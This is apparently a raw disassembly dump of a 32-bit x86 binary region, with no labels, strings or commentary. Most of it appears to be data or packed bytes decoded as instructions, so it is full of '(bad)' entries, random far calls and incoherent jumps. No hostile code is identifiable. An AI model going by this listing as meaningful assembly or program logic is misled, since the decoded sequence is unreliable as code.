  41ec25:	add    BYTE PTR [ebx+0x0],cl
  41ec28:	inc    esp
  41ec29:	add    BYTE PTR [eax+eax*1+0x4a],cl
  41ec2d:	add    BYTE PTR [ebx+0x0],cl
  41ec30:	dec    eax
  41ec31:	add    BYTE PTR [eax+eax*1+0x4a],al
  41ec35:	add    BYTE PTR [eax],al
  41ec37:	add    BYTE PTR [eax],al
  41ec39:	add    dh,bh
  41ec3b:	jmp    0x41ec7e
	...
  41ec45:	add    BYTE PTR [eax+0x59004191],bl
  41ec4b:	dec    edi
  41ec4c:	pop    edi
  41ec4d:	dec    edi
  41ec4e:	inc    eax
  41ec4f:	dec    edi
  41ec50:	inc    esp
  41ec51:	dec    edi
  41ec52:	pop    edi
  41ec53:	dec    edi
  41ec54:	inc    esi
  41ec55:	dec    edi
  41ec56:	add    DWORD PTR [edi+0x0],ecx
  41ec59:	dec    edi
  41ec5a:	xor    cl,BYTE PTR [edi+0x0]
  41ec5d:	add    BYTE PTR [ebp+0x4f],bl
  41ec60:	pop    esi
  41ec61:	dec    edi
  41ec62:	pop    ebx
  41ec63:	dec    edi
  41ec64:	add    DWORD PTR [edi+0x0],ecx
  41ec67:	dec    edi
  41ec68:	xor    cl,BYTE PTR [edi+0x4f]
  41ec6b:	dec    edi
  41ec6c:	inc    ecx
  41ec6d:	dec    edi
  41ec6e:	pop    edi
  41ec6f:	dec    edi
  41ec70:	inc    eax
  41ec71:	dec    edi
  41ec72:	add    DWORD PTR [edi+0x0],ecx
  41ec75:	dec    edi
  41ec76:	xor    cl,BYTE PTR [edi+0x0]
  41ec79:	add    BYTE PTR [ecx+0x4f],al
  41ec7c:	pop    edx
  41ec7d:	dec    edi
  41ec7e:	inc    esi
  41ec7f:	dec    edi
  41ec80:	dec    ebp
  41ec81:	dec    edi
  41ec82:	push   ebx
  41ec83:	dec    edi
  41ec84:	inc    edx
  41ec85:	dec    edi
  41ec86:	pop    ebx
  41ec87:	dec    edi
  41ec88:	xor    cl,BYTE PTR [edi+0x0]
  41ec8b:	add    BYTE PTR [eax],al
  41ec8d:	add    BYTE PTR [esi+0x7d],ch
  41ec90:	outs   dx,BYTE PTR ds:[esi]
  41ec91:	lea    ebp,[esi-0x63]
  41ec94:	outs   dx,BYTE PTR ds:[esi]
  41ec95:	lods   eax,DWORD PTR ds:[esi]
  41ec96:	outs   dx,BYTE PTR ds:[esi]
  41ec97:	mov    ebp,0xdd6ecd6e
  41ec9c:	outs   dx,BYTE PTR ds:[esi]
  41ec9d:	in     eax,dx
  41ec9e:	outs   dx,BYTE PTR ds:[esi]
  41ec9f:	std    
  41eca0:	outs   dx,BYTE PTR ds:[esi]
  41eca1:	or     eax,0x2d6e1d6e
  41eca6:	outs   dx,BYTE PTR ds:[esi]
  41eca7:	cmp    eax,0x6d6e5d6e
  41ecac:	outs   dx,BYTE PTR ds:[esi]
  41ecad:	jb     0x41ed1d
  41ecaf:	jae    0x41ed1f
  41ecb1:	jo     0x41ed21
  41ecb3:	jno    0x41ed23
  41ecb5:	jbe    0x41ed25
  41ecb7:	ja     0x41ed27
  41ecb9:	je     0x41ed29
  41ecbb:	jne    0x41ed2b
  41ecbd:	mov    ch,BYTE PTR [esi-0x75]
  41ecc0:	outs   dx,BYTE PTR ds:[esi]
  41ecc1:	mov    BYTE PTR [esi-0x77],ch
  41ecc4:	outs   dx,BYTE PTR ds:[esi]
  41ecc5:	mov    gs,WORD PTR [esi+0x7c]
  41ecc8:	pop    esi
  41ecc9:	jge    0x41ed19
  41eccb:	jge    0x41ec8b
  41eccd:	jge    0x41ed2b
  41eccf:	(bad)  
  41ecd0:	jge    0x41ed42
  41ecd2:	mov    ebp,0x71736eb1
  41ecd7:	bound  ebp,QWORD PTR [edx+0x70265fc6]
  41ecdd:	add    BYTE PTR [ebp+0x17],cl
  41ece0:	mov    ebx,0x4af4bd56
  41ece5:	aaa    
  41ece6:	dec    edx
  41ece7:	jle    0x41ec86
  41ece9:	jno    0x41ed3f
  41eceb:	mov    cl,0x8
  41eced:	imul   ebp,DWORD PTR [eax+ecx*1+0x58fd7d8],0x48
  41ecf5:	xlat   BYTE PTR ds:[ebx]
  41ecf6:	lds    edx,FWORD PTR [ebx+0x7dc4114c]
  41ecfc:	ret    
  41ecfd:	fidiv  WORD PTR [edi]
  41ecff:	into   
  41ed00:	mul    BYTE PTR [esi+0x1faa3204]
  41ed06:	push   0xc5c644f1
  41ed0b:	sbb    ch,al
  41ed0d:	jno    0x41ed0f
  41ed0f:	add    BYTE PTR [eax],al
  41ed11:	add    dh,ch
  41ed13:	(bad)  [ebx+0x7]
  41ed16:	mov    edx,0x450041eb
  41ed1b:	das    
  41ed1c:	shl    BYTE PTR [edx],0xb4
  41ed1f:	rol    BYTE PTR [ecx+0x0],1
  41ed22:	inc    esi
  41ed23:	push   ebx
  41ed24:	outs   dx,DWORD PTR ds:[esi]
  41ed25:	push   ebx
  41ed26:	push   edx
  41ed27:	jmp    0x41ed6a
  41ed29:	add    BYTE PTR [esi-0x71ffbe15],dh
  41ed2f:	in     eax,dx
  41ed30:	adc    al,BYTE PTR [edi]
  41ed32:	jae    0x41ed9d
  41ed34:	inc    edx
  41ed35:	jae    0x41ed9c
  41ed37:	popa   
  41ed38:	push   ecx
  41ed39:	pop    eax
  41ed3a:	pop    ecx
  41ed3b:	outs   dx,BYTE PTR ds:[esi]
  41ed3c:	jbe    0x41edb6
  41ed3e:	jns    0x41ed94
  41ed40:	push   ecx
  41ed41:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  41ed45:	je     0x41edb6
  41ed47:	jns    0x41edb7
  41ed49:	popa   
  41ed4a:	push   esi
  41ed4b:	push   ebp
  41ed4c:	push   0x57564476
  41ed51:	dec    edx
  41ed52:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  41ed59:	popa   
	...
  41ed6e:	jp     0x41edc4
  41ed70:	arpl   WORD PTR [ecx+0x4b],cx
  41ed73:	push   edx
  41ed74:	imul   ebp,DWORD PTR [eax+0x45],0x55487459
  41ed7b:	jp     0x41ede9
  41ed7d:	jb     0x41edd2
  41ed7f:	outs   dx,DWORD PTR ds:[esi]
  41ed80:	push   ebx
  41ed81:	inc    esi
  41ed82:	inc    edi
  41ed83:	push   0x66495949
  41ed88:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  41ed8c:	push   esi
  41ed8d:	jb     0x41edf7
  41ed8f:	add    BYTE PTR [ecx+0x43],ah
  41ed92:	push   ecx
  41ed93:	ins    BYTE PTR es:[edi],dx
  41ed94:	pop    eax
  41ed95:	ja     0x41ede4
  41ed97:	je     0x41ee0f
  41ed99:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  41ed9d:	add    BYTE PTR [edi+0x56],dl
  41eda0:	push   esp
  41eda1:	dec    eax
  41eda2:	je     0x41edf0
  41eda4:	push   ebx
  41eda5:	jne    0x41ee12
  41eda7:	popa   
  41eda8:	jns    0x41edaa
  41edaa:	dec    edi
  41edab:	push   esp
  41edac:	dec    edi
  41edad:	dec    ebx
  41edae:	pop    edi
  41edaf:	pop    ebx
  41edb0:	dec    edi
  41edb1:	push   esp
  41edb2:	add    bl,BYTE PTR [esi]
  41edb4:	adc    ch,BYTE PTR ds:0x7c14241f
  41edba:	push   eax
  41edbb:	jge    0x41edbe
  41edbd:	add    BYTE PTR [eax-0x44fffffa],cl
  41edc3:	inc    ecx
  41edc4:	adc    DWORD PTR [ebp+eiz*4+0x125bd2ab],ebp
  41edcb:	jecxz  0x41ed6c
  41edcd:	test   cl,bl
  41edcf:	ds pop esi
  41edd1:	cdq    
  41edd2:	addr16 adc bl,0x9
  41edd6:	or     cl,0x1e
  41edd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edda:	adc    BYTE PTR [ecx+edi*2+0x25],al
  41edde:	sbb    bh,BYTE PTR [ecx-0x11bbaec3]
  41ede4:	xor    eax,0x8afe824b
  41ede9:	xor    al,0xca
  41edeb:	dec    esp
  41edec:	ins    BYTE PTR es:[edi],dx
  41eded:	push   ss
  41edee:	mov    gs,esi
  41edf0:	rcr    esp,0xcb
  41edf3:	inc    eax
  41edf4:	push   ecx
  41edf5:	or     edx,DWORD PTR [edx+eiz*8+0x3]
  41edf9:	cdq    
  41edfa:	fadd   st(1),st
  41edfc:	inc    ebp
  41edfd:	outs   dx,BYTE PTR ds:[esi]
  41edfe:	xchg   edx,eax
  41edff:	ret    
  41ee00:	mov    esp,0x3503edb9
  41ee05:	xchg   BYTE PTR [edi+0x5ff9f03d],dh
  41ee0b:	js     0x41ee1a
  41ee0d:	dec    eax
  41ee0e:	cwde   
  41ee0f:	rcr    BYTE PTR [ebx-0x3d],0x84
  41ee13:	xchg   edi,eax
  41ee14:	test   DWORD PTR [esi],esp
  41ee16:	xchg   esp,eax
  41ee17:	and    al,0xc4
  41ee19:	pop    ss
  41ee1a:	mov    edx,0x51426ab7
  41ee1f:	cmp    edi,eax
  41ee21:	aas    
  41ee22:	out    dx,al
  41ee23:	or     ecx,DWORD PTR [ebp+0x2eb1c474]
  41ee29:	ja     0x41ee3f
  41ee2b:	add    esp,ebx
  41ee2d:	mov    ah,0xc4
  41ee2f:	add    esp,DWORD PTR [edx]
  41ee31:	jne    0x41edd6
  41ee33:	mov    ah,BYTE PTR [edx+0x60a70b53]
  41ee39:	call   0x6de1:0x9af788e
  41ee40:	jne    0x41edef
  41ee42:	sbb    eax,0x152fe74
  41ee47:	daa    
  41ee48:	push   edi
  41ee49:	aaa    
  41ee4a:	adc    ebp,DWORD PTR [ebp+0x6f4dfe2b]
  41ee50:	fst    st(3)
  41ee52:	xor    BYTE PTR [edi+eiz*8+0x1],ah
  41ee56:	mov    bh,0x68
  41ee58:	(bad)  
  41ee59:	push   eax
  41ee5a:	outs   dx,DWORD PTR ds:[esi]
  41ee5b:	mov    ch,0xf9
  41ee5d:	std    
  41ee5e:	cmp    ch,BYTE PTR [ecx-0x7]
  41ee61:	aas    
  41ee62:	ficom  WORD PTR [ebx+0xc00cb8]
  41ee68:	clc    
  41ee69:	jp     0x41ee73
  41ee6b:	enter  0xacd1,0xd8
  41ee6f:	sbb    eax,0xac3b7b9e
  41ee74:	ss mov gs,WORD PTR ds:[edx+0x79c66bab]
  41ee7c:	jo     0x41ee00
  41ee7e:	sbb    eax,0x5a63b84e
  41ee83:	cmp    DWORD PTR [esp+edx*8],0x27
  41ee87:	fwait
  41ee88:	les    edx,FWORD PTR [edx+eax*2]
  41ee8b:	pop    ecx
  41ee8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee8d:	pusha  
  41ee8e:	sbb    esp,DWORD PTR [edx+0x7330a81f]
  41ee94:	test   BYTE PTR [edi+esi*2],0x7b
  41ee98:	cmp    eax,0x452a7c6e
  41ee9d:	xor    ch,bh
  41ee9f:	repnz cdq 
  41eea1:	iret   
  41eea2:	cld    
  41eea3:	mov    ecx,0x2e3d8292
  41eea8:	int    0x53
  41eeaa:	mov    ebx,0xd5739717
  41eeaf:	sbb    al,0xb3
  41eeb1:	stos   DWORD PTR es:[edi],eax
  41eeb2:	loope  0x41ef2a
  41eeb4:	inc    ecx
  41eeb5:	dec    ebx
  41eeb6:	cmp    ebx,eax
  41eeb8:	inc    eax
  41eeb9:	add    dl,BYTE PTR [ebp+0xb]
  41eebc:	jle    0x41eeaa
  41eebe:	adc    DWORD PTR [edx+esi*8],ecx
  41eec1:	mov    bl,0x4e
  41eec3:	jnp    0x41ef21
  41eec5:	xor    ebp,DWORD PTR [ebx-0x2b]
  41eec8:	mov    ebx,0x12dc48a1
  41eecd:	or     esp,ecx
  41eecf:	adc    ecx,DWORD PTR [edi]
  41eed1:	pop    ecx
  41eed2:	inc    ecx
  41eed3:	mov    DWORD PTR [edi+0x2b32cb33],esi
  41eed9:	loope  0x41eeb1
  41eedb:	rep ins DWORD PTR es:[edi],dx
  41eedd:	push   ss
  41eede:	jo     0x41ef0f
  41eee0:	mov    esi,0xa50ab30b
  41eee5:	or     esp,ebp
  41eee7:	ss loopne 0x41ef20
  41eeea:	lods   eax,DWORD PTR ds:[esi]
  41eeeb:	outs   dx,BYTE PTR ds:[esi]
  41eeec:	pop    ebp
  41eeed:	jae    0x41ee90
  41eeef:	ror    BYTE PTR [eax-0x5e0f4366],0xcb
  41eef6:	or     DWORD PTR [ebp+0x32],esi
  41eef9:	je     0x41ef5e
  41eefb:	call   0xee14:0xe8547521
  41ef02:	shr    dh,1
  41ef04:	cmp    cl,BYTE PTR [ecx+0x52]
  41ef07:	jns    0x41eeb7
  41ef09:	pop    ebx
  41ef0a:	inc    ebp
  41ef0b:	stos   DWORD PTR es:[edi],eax
  41ef0c:	fs stos BYTE PTR es:[edi],al
  41ef0e:	cli    
  41ef0f:	xor    edi,DWORD PTR [esi]
  41ef11:	adc    eax,DWORD PTR [edi]
  41ef13:	pusha  
  41ef14:	ror    ch,1
  41ef16:	dec    ecx
  41ef17:	inc    eax
  41ef18:	pop    ebx
  41ef19:	retf   
  41ef1a:	pop    edx
  41ef1b:	or     cl,bl
  41ef1d:	(bad)  
  41ef1e:	sbb    dl,BYTE PTR [edx]
  41ef20:	call   0xb383:0xba346ac1
  41ef27:	in     al,dx
  41ef28:	jnp    0x41ef07
  41ef2a:	les    ebx,FWORD PTR gs:[eax+0x70c4eafb]
  41ef31:	fldcw  WORD PTR [ecx+esi*8]
  41ef34:	cmp    BYTE PTR [edi+ecx*4+0x1e],0x2b
  41ef39:	xchg   edx,eax
  41ef3a:	push   esp
  41ef3b:	ss add BYTE PTR ss:[ebp-0x243ce235],dl
  41ef43:	pop    ds
  41ef44:	imul   ebx,edi,0xffffff97
  41ef47:	test   eax,0x769682ba
  41ef4c:	pop    edx
  41ef4d:	push   es
  41ef4e:	test   eax,0x8821b1ff
  41ef53:	cmp    al,dl
  41ef55:	pusha  
  41ef56:	(bad)  
  41ef58:	or     esi,edi
  41ef5a:	pop    esp
  41ef5b:	jb     0x41eef0
  41ef5d:	sar    bh,0x81
  41ef60:	ins    DWORD PTR es:[edi],dx
  41ef61:	push   ecx
  41ef62:	sar    edi,1
  41ef64:	push   ss
  41ef65:	and    al,0xdb
  41ef67:	das    
  41ef68:	xor    al,0x2
  41ef6a:	das    
  41ef6b:	aam    0xf9
  41ef6d:	pop    edi
  41ef6e:	dec    ebx
  41ef6f:	xor    DWORD PTR [edx+eiz*2],eax
  41ef72:	pop    esp
  41ef73:	ins    BYTE PTR es:[edi],dx
  41ef74:	mov    al,ds:0xeb664a48
  41ef79:	push   ds
  41ef7a:	loope  0x41ef8c
  41ef7c:	loope  0x41eefe
  41ef7e:	pop    es
  41ef7f:	push   ebx
  41ef80:	pop    ebx
  41ef81:	xchg   BYTE PTR [edx+0x7297c304],ah
  41ef87:	add    BYTE PTR [ecx],bh
  41ef89:	sti    
  41ef8a:	dec    DWORD PTR [ecx]
  41ef8c:	add    esi,edi
  41ef8e:	xchg   ecx,eax
  41ef8f:	aad    0x5d
  41ef91:	lods   al,BYTE PTR ds:[esi]
  41ef92:	pop    edx
  41ef93:	adc    edi,edi
  41ef95:	lahf   
  41ef96:	mov    ebp,0xa9871ab0
  41ef9b:	ins    BYTE PTR es:[edi],dx
  41ef9c:	push   edi
  41ef9d:	mov    cl,0xe2
  41ef9f:	les    ecx,FWORD PTR ds:0x3c83d6a5
  41efa5:	and    BYTE PTR [eax-0x38],bl
  41efa8:	and    ecx,edx
  41efaa:	adc    al,0x3
  41efac:	outs   dx,DWORD PTR ds:[esi]
  41efad:	mov    BYTE PTR [ebp-0x478a4c75],bl
  41efb3:	shl    BYTE PTR [ecx+0x9],0xbc
  41efb7:	aaa    
  41efb8:	push   eax
  41efb9:	xchg   ebx,eax
  41efba:	push   edi
  41efbb:	mov    edi,0x8fd793f0
  41efc0:	lds    esp,FWORD PTR [ecx+0x37644d82]
  41efc6:	sbb    al,BYTE PTR [ebp+0x59]
  41efc9:	xchg   edi,eax
  41efca:	je     0x41ef50
  41efcc:	jnp    0x41f03d
  41efce:	cmc    
  41efcf:	mov    bl,0x2b
  41efd1:	gs cmp eax,0x952acad8
  41efd7:	test   DWORD PTR [edx*4+0x22bd3350],0x288822cd
  41efe2:	mov    edi,0x797762
  41efe7:	(bad)  
  41efea:	cmp    BYTE PTR [eax+0x383561f0],dh
  41eff0:	aas    
  41eff1:	leave  
  41eff2:	adc    eax,0x39f983d3
  41eff7:	cwde   
  41eff8:	and    cl,BYTE PTR [edi+0x47fae15c]
  41effe:	mov    ebp,0xd250f577
  41f003:	and    ch,ah
  41f005:	jmp    0xe1f8:0xf8016907
  41f00c:	push   esi
  41f00d:	dec    ebp
  41f00e:	aaa    
  41f00f:	fist   DWORD PTR [ecx+0x48fe3caa]
  41f015:	rol    DWORD PTR [ecx],0xf1
  41f018:	xchg   edx,eax
  41f019:	(bad)  
  41f01a:	or     eax,0xfcedcf46
  41f01f:	iret   
  41f020:	inc    ecx
  41f021:	mov    edx,0x69774151
  41f026:	xlat   BYTE PTR ds:[ebx]
  41f027:	in     eax,dx
  41f028:	mov    ds:0x654a29b0,al
  41f02d:	stos   DWORD PTR es:[edi],eax
  41f02e:	jno    0x41f04b
  41f030:	sub    eax,0xcdf7d266
  41f035:	jmp    0x41efd1
  41f037:	push   ss
  41f038:	mov    eax,0x802f2bbe
  41f03d:	jg     0x41efe8
  41f03f:	mov    eax,0x89ffb5b3
  41f044:	out    dx,al
  41f045:	outs   dx,BYTE PTR ds:[esi]
  41f046:	inc    edi
  41f047:	jns    0x41efe0
  41f049:	cmp    bl,dh
  41f04b:	int    0x99
  41f04d:	jbe    0x41f0c7
  41f04f:	sti    
  41f050:	xchg   BYTE PTR [eax+0x837ab01],cl
  41f056:	add    al,0xf4
  41f058:	mov    dh,0xb9
  41f05a:	shr    DWORD PTR [ecx+0xce3ed34],1
  41f060:	sub    esi,esp
  41f062:	and    eax,0x7b812628
  41f067:	pop    edi
  41f068:	mov    edi,0x43843670
  41f06d:	cmc    
  41f06e:	imul   bp,WORD PTR [edi+0x55de264c],0x1b00
  41f077:	rcr    DWORD PTR [eax-0x6d],0x48
  41f07b:	lock add al,0x5b
  41f07e:	push   0x9f400110
  41f083:	in     al,0x13
  41f085:	cdq    
  41f086:	fisub  DWORD PTR [ebp-0x61]
  41f089:	daa    
  41f08a:	sbb    eax,0xe5dacbde
  41f08f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f090:	cld    
  41f091:	push   eax
  41f092:	xchg   ebx,eax
  41f093:	push   esp
  41f094:	dec    esi
  41f095:	and    eax,0xe3823db
  41f09a:	into   
  41f09b:	idiv   DWORD PTR [ebx-0x24f6c45a]
  41f0a1:	jle    0x41f0af
  41f0a3:	int    0xe6
  41f0a5:	xchg   ecx,eax
  41f0a6:	mov    BYTE PTR [edi+0x6d],bh
  41f0a9:	push   cs
  41f0aa:	mov    eax,ds:0x9f9a627c
  41f0af:	cdq    
  41f0b0:	push   esi
  41f0b1:	fdiv   DWORD PTR [esi]
  41f0b3:	xchg   ecx,eax
  41f0b4:	ret    
  41f0b5:	shr    BYTE PTR [eax+0x53477d0d],cl
  41f0bb:	lods   al,BYTE PTR ds:[esi]
  41f0bc:	jbe    0x41f052
  41f0be:	xchg   ebp,eax
  41f0bf:	inc    eax
  41f0c0:	pushf  
  41f0c1:	xor    edx,DWORD PTR [edx+0xe]
  41f0c4:	dec    ebp
  41f0c5:	sub    DWORD PTR [ecx+0x5e83e5dc],ecx
  41f0cb:	(bad)  
  41f0cc:	jb     0x41f0ad
  41f0ce:	into   
  41f0cf:	jmp    0x41f0c7
  41f0d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0d2:	cmp    eax,0x71684c6b
  41f0d7:	mov    ebx,0x8cabfc62
  41f0dc:	mov    bl,0x52
  41f0de:	ins    BYTE PTR es:[edi],dx
  41f0df:	retf   
  41f0e0:	outs   dx,BYTE PTR ds:[esi]
  41f0e1:	sbb    DWORD PTR [eax],edx
  41f0e3:	xlat   BYTE PTR ds:[ebx]
  41f0e4:	xchg   ebx,eax
  41f0e5:	pusha  
  41f0e6:	fnstsw WORD PTR [edi+0x461a6001]
  41f0ec:	ret    
  41f0ed:	fistp  WORD PTR [eax-0x4e]
  41f0f0:	cmp    DWORD PTR [edx-0x2da4d1cd],ebx
  41f0f6:	stc    
  41f0f7:	add    DWORD PTR [edi-0x6a],ebx
  41f0fa:	int3   
  41f0fb:	pushf  
  41f0fc:	std    
  41f0fd:	stc    
  41f0fe:	call   0x6fbc:0x7090e6d8
  41f105:	jmp    0x9f50:0xe7a7e340
  41f10c:	clc    
  41f10d:	loope  0x41f0df
  41f10f:	fisubr DWORD PTR [edx+0x5]
  41f112:	push   ds
  41f113:	mov    ch,0x2
  41f115:	mov    BYTE PTR [ebp-0x61af1971],bh
  41f11b:	add    cl,BYTE PTR [edi+0x6]
  41f11e:	bound  edx,QWORD PTR [ebx-0x3a]
  41f121:	cdq    
  41f122:	cwde   
  41f123:	or     eax,0x379c752f
  41f128:	call   0xbe1687ad
  41f12d:	icebp  
  41f12e:	cmp    ecx,DWORD PTR [edi+edx*2+0x60]
  41f132:	jbe    0x41f19d
  41f134:	push   es
  41f135:	xor    al,0xbc
  41f137:	mov    eax,ds:0x75158cbf
  41f13c:	mov    ah,0x66
  41f13e:	mov    edx,DWORD PTR ss:[ecx+ebp*8]
  41f142:	mov    bh,0x2d
  41f144:	hlt    
  41f145:	pop    ecx
  41f146:	popf   
  41f147:	gs cmp al,0xd5
  41f14a:	mov    WORD PTR [ebp-0x4eab6d7b],?
  41f150:	aaa    
  41f151:	aam    0x3
  41f153:	xchg   edx,eax
  41f154:	adc    edx,edi
  41f156:	leave  
  41f157:	fsub   DWORD PTR [esi+0x73196077]
  41f15d:	mov    ecx,DWORD PTR [ecx]
  41f15f:	in     al,dx
  41f160:	mov    DWORD PTR [esi+ebx*1],esp
  41f163:	fnstsw WORD PTR [edi+0xc]
  41f166:	call   0x12f1:0x1f747a1e
  41f16d:	pop    ebp
  41f16e:	loope  0x41f1b3
  41f170:	ins    DWORD PTR es:[edi],dx
  41f171:	mov    ah,0xf8
  41f173:	inc    ebx
  41f174:	icebp  
  41f175:	xchg   DWORD PTR ds:0xbfafb5f9,ebp
  41f17b:	pop    ss
  41f17c:	in     eax,0x53
  41f17e:	imul   esi,DWORD PTR [ecx],0xe22f5d0f
  41f184:	sub    al,0xb6
  41f186:	adc    ebx,edi
  41f188:	cdq    
  41f189:	adc    al,0xf7
  41f18b:	pusha  
  41f18c:	cmp    al,BYTE PTR [eax+0x30609ea0]
  41f192:	mov    esi,es
  41f194:	or     eax,0x89b9b6da
  41f199:	test   eax,0x36260f58
  41f19e:	fist   DWORD PTR [edx-0x202267ed]
  41f1a4:	fstp   TBYTE PTR [ecx-0x34836251]
  41f1aa:	imul   esp,DWORD PTR [edx],0xeb0601c6
  41f1b0:	pushf  
  41f1b1:	mov    BYTE PTR [esi+0x44],dh
  41f1b4:	cld    
  41f1b5:	nop
  41f1b6:	sbb    DWORD PTR [edi],edi
  41f1b8:	push   0x83419319
  41f1bd:	ret    
  41f1be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1bf:	loopne 0x41f1ac
  41f1c1:	jle    0x41f1e7
  41f1c3:	push   esp
  41f1c4:	outs   dx,DWORD PTR ds:[esi]
  41f1c5:	mov    DWORD PTR [eax-0x67],esp
  41f1c8:	and    cl,BYTE PTR [edx+0x71c4823f]
  41f1ce:	mov    ch,0x47
  41f1d0:	hlt    
  41f1d1:	mul    DWORD PTR es:[ebx+0x76]
  41f1d5:	push   ecx
  41f1d6:	push   ebx
  41f1d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1d8:	pop    es
  41f1d9:	xchg   DWORD PTR [esi+0x1d602261],esp
  41f1df:	fnstenv [ebp-0x61]
  41f1e2:	das    
  41f1e3:	je     0x41f1d4
  41f1e5:	jp     0x41f1a3
  41f1e7:	cmp    DWORD PTR ds:0xa3ab4c31,eax
  41f1ed:	push   ds
  41f1ee:	cmp    al,0xfb
  41f1f0:	xchg   ecx,eax
  41f1f1:	mov    ds:0x2c2e8bc3,eax
  41f1f6:	(bad)  
  41f1f7:	outs   dx,BYTE PTR ds:[esi]
  41f1f8:	das    
  41f1f9:	xor    eax,0x85dfba0c
  41f1fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1ff:	scas   eax,DWORD PTR es:[edi]
  41f200:	xchg   esp,eax
  41f201:	mov    ds:0xf5066b87,eax
  41f206:	ins    DWORD PTR es:[edi],dx
  41f207:	adc    ebx,ebp
  41f209:	call   0x593ceca0
  41f20e:	and    cl,BYTE PTR [eax+0x3edb590b]
  41f214:	out    0x89,al
  41f216:	sahf   
  41f217:	mov    al,ds:0x818d57ab
  41f21c:	aad    0x7f
  41f21e:	jno    0x41f265
  41f220:	xor    al,BYTE PTR [edi+ebp*8+0x7e]
  41f224:	or     BYTE PTR [ecx+0x29],0x85
  41f228:	scas   eax,DWORD PTR es:[edi]
  41f229:	pop    esi
  41f22a:	rol    BYTE PTR [edx],cl
  41f22c:	es icebp 
  41f22e:	add    ecx,DWORD PTR [ebx-0x2c1687c7]
  41f234:	iret   
  41f235:	sub    eax,0xb0f29802
  41f23a:	andnps xmm0,xmm5
  41f23d:	sub    eax,0x1ae270ae
  41f242:	pop    ecx
  41f243:	ss lock leave 
  41f246:	aad    0x9e
  41f248:	es cld 
  41f24a:	fnsave [esi+eiz*4-0xc92e742]
  41f251:	call   0x57e5:0x799d5328
  41f258:	scas   al,BYTE PTR es:[edi]
  41f259:	(bad)  
  41f25a:	das    
  41f25b:	mov    ds:0x1b0352d4,eax
  41f260:	add    BYTE PTR ds:0x5a35f0f4,dl
  41f266:	loope  0x41f2e3
  41f268:	bound  ecx,QWORD PTR [ebx]
  41f26a:	ins    BYTE PTR es:[edi],dx
  41f26b:	inc    ebp
  41f26c:	xor    cl,bh
  41f26e:	retf   0x9ccd
  41f271:	push   es
  41f272:	scas   al,BYTE PTR es:[edi]
  41f273:	adc    al,0x48
  41f275:	add    eax,0xd86840a5
  41f27a:	mov    bl,0x3b
  41f27c:	pop    edi
  41f27d:	lods   al,BYTE PTR ds:[esi]
  41f27e:	or     esp,esi
  41f280:	call   0x841b:0xa5fbb348
  41f287:	rcr    dh,cl
  41f289:	xchg   ebp,eax
  41f28a:	mov    ds:0xa3003d6,al
  41f28f:	inc    esp
  41f290:	bound  eax,QWORD PTR [eax]
  41f292:	xchg   edx,eax
  41f293:	cwde   
  41f294:	inc    esp
  41f296:	in     eax,0xaf
  41f298:	aam    0x58
  41f29a:	push   ecx
  41f29b:	stc    
  41f29c:	inc    esi
  41f29d:	lds    edx,FWORD PTR [ecx]
  41f29f:	imul   edi,DWORD PTR [esi],0xffffffc9
  41f2a2:	and    al,0x1
  41f2a4:	int    0x43
  41f2a6:	rol    ebp,0xd9
  41f2a9:	xor    eax,0x3b6a81e1
  41f2ae:	stos   BYTE PTR es:[edi],al
  41f2af:	js     0x41f237
  41f2b1:	jmp    0x4620:0x1bdf4ff0
  41f2b8:	(bad)  
  41f2b9:	sahf   
  41f2ba:	popa   
  41f2bb:	xchg   esi,eax
  41f2bc:	xor    eax,DWORD PTR [eax-0x40a739e2]
  41f2c2:	enter  0x5482,0x43
  41f2c6:	cmp    ebp,edi
  41f2c8:	xchg   ecx,eax
  41f2c9:	pusha  
  41f2ca:	cdq    
  41f2cb:	fwait
  41f2cc:	cld    
  41f2cd:	ins    DWORD PTR es:[edi],dx
  41f2ce:	mov    ah,0x4f
  41f2d0:	test   eax,0x49839456
  41f2d5:	xor    esi,DWORD PTR [edi]
  41f2d7:	bound  ebx,QWORD PTR [ecx]
  41f2d9:	fidiv  WORD PTR ds:0x7c143164
  41f2df:	adc    dl,BYTE PTR [edi+0x40]
  41f2e2:	and    eax,0x4b246f9
  41f2e7:	push   ss
  41f2e8:	stos   DWORD PTR es:[edi],eax
  41f2e9:	sbb    bh,0xab
  41f2ec:	cmp    eax,0x4bdd486c
  41f2f1:	or     ch,BYTE PTR [edi+ebp*2]
  41f2f4:	nop
  41f2f5:	pushf  
  41f2f6:	push   edx
  41f2f7:	into   
  41f2f8:	jnp    0x41f34c
  41f2fa:	add    esi,DWORD PTR [edx]
  41f2fc:	push   ss
  41f2fd:	ror    BYTE PTR [eax],1
  41f2ff:	sqrtps xmm5,xmm1
  41f302:	jmp    0x98a2e43f
  41f307:	imul   ebx,DWORD PTR [eax],0xfffffff1
  41f30a:	xchg   esi,eax
  41f30b:	imul   esi,DWORD PTR [edx],0x6a
  41f30e:	inc    ebp
  41f30f:	ins    DWORD PTR es:[edi],dx
  41f310:	pushf  
  41f311:	add    ebp,edx
  41f313:	(bad)  
  41f314:	stos   DWORD PTR es:[edi],eax
  41f315:	sbb    eax,ecx
  41f317:	out    0xba,eax
  41f319:	push   ds
  41f31a:	cmp    al,0x26
  41f31c:	mov    cl,0x64
  41f31e:	or     eax,DWORD PTR [ecx]
  41f320:	jmp    0x41f2d6
  41f322:	jmp    0xf6e5:0xd35db22
  41f329:	rol    BYTE PTR [eax-0x4c],1
  41f32c:	(bad)  
  41f32d:	loopne 0x41f35d
  41f32f:	test   BYTE PTR [edx-0x2],dl
  41f332:	sbb    BYTE PTR [eax],bh
  41f334:	test   eax,0x8c4bb41c
  41f339:	cld    
  41f33a:	fist   WORD PTR [ebp+0x5b7d498b]
  41f340:	xchg   edi,eax
  41f341:	xchg   al,dl
  41f343:	(bad)  
  41f344:	xor    eax,0x24579cb6
  41f349:	mov    ds:0xcfe655f3,eax
  41f34e:	xor    ch,BYTE PTR [ebx+0x14]
  41f351:	leave  
